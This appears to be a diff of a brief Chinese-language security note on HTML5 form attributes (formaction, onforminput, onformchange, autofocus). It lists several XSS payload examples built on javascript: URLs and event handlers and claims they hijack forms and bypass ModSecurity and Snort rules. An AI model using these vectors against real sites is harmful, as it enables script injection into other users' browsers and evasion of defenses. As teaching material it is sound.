@@ -1,9 +1,12 @@
-
-新特性：HTML5中from出现新属性formaction onformchange onforminput autofocus 等
-
-危害性：可用于XSS攻击；
+------
+*特性：HTML5中from出现新属性formaction onformchange onforminput autofocus 等
+*属性与方法：<form id="test">
+2        <input type="submit" name="name"  value="提交" formmethod="get" formaction="javascript:alert(1)" >xss
+3     </form>
+------
+安全性：可用于反射型XSS攻击；
         例如formaction属性 可直接标记按钮button 外部劫持表单;绕过modesecurity和snort的规则检测
-  
-        例如：<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+------
+典例：<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
               <form id="test" onforminput=alert(1)><input></from><button from=test onfromchange=alert(2)>x</button>
               <input onfocus=write(1) autofocus>
